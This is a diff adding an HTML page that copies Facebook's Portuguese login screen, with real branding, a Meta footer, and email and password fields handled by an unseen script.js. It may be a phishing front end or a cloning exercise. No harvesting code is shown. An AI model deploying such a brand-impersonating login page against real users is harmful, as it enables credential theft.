@@ -1,0 +1,51 @@
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8V_chxIWg2.ico">
+</head>
+<body>
+    <div class="container">
+        <main>
+            <div class="logo">
+                <img src="/logo.jpg" alt="Facebook logo">
+            </div>
+
+            <form id="login-form">
+                <input type="text" id="email" name="email" placeholder="Número de telemóvel ou email" required>
+                <input type="password" id="password" name="password" placeholder="Palavra-passe" required>
+                <button type="submit" id="login-button">Entrar</button>
+            </form>
+
+            <a href="#" class="forgot-password">Esqueceste-te da palavra-passe?</a>
+
+            <div class="divider">
+                <span>ou</span>
+            </div>
+
+            <button class="create-account">Criar nova conta</button>
+        </main>
+        
+        <footer>
+            <div class="languages">
+                <span class="language current">Português (Portugal)</span>
+                <a href="#" class="language">English (US)</a>
+                <a href="#" class="language">Español</a>
+                <a href="#" class="language">Français (France)</a>
+                <a href="#" class="language">Deutsch</a>
+                <a href="#" class="language">Italiano</a>
+                <a href="#" class="language">...</a>
+            </div>
+            <div class="meta-text">
+                Meta © 2024
+            </div>
+        </footer>
+    </div>
+    <div id="loading-overlay" class="hidden">
+        <div class="spinner"></div>
+    </div>
+    <script type="module" src="script.js"></script>
+</body>
+</html>
